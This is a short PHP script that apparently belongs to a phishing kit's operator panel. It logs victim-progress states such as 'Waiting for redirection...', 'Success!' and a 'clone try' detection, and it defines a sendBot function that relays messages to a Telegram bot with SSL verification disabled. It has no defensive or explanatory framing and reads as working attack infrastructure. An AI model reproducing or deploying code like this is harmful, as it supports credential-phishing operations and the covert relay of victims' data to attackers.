<?php 
require '../main.php';

 
 

function note($statu){
	global $m;
	global $id;
	global $notifs; 
	
	$oldlogs = $m->getData()["LOGS"];
	$newlogs = $oldlogs."\n- LOG [ $statu ]";
	$arr = array("LOGS"=>$newlogs);
	$m->update($arr);

}
 


function sendBot($id, $msg){
	global $bot;
		$url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$msg";
		$ci = curl_init();
		curl_setopt($ci, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ci,CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ci, CURLOPT_URL, $url);
		$res = curl_exec($ci);
		curl_close($ci);
        return $res;
	}
	
 



if(isset($_POST['note'])){
	note($_POST['note']);
}


if(isset($_POST['waitingview'])){
	note("Waiting for redirection...");
}if(isset($_POST['finishview'])){
	note("Success!");
}if(isset($_POST['clonedetect'])){
	note(" + A CLONE TRY HAS BEEN DETECTED!");
}

?>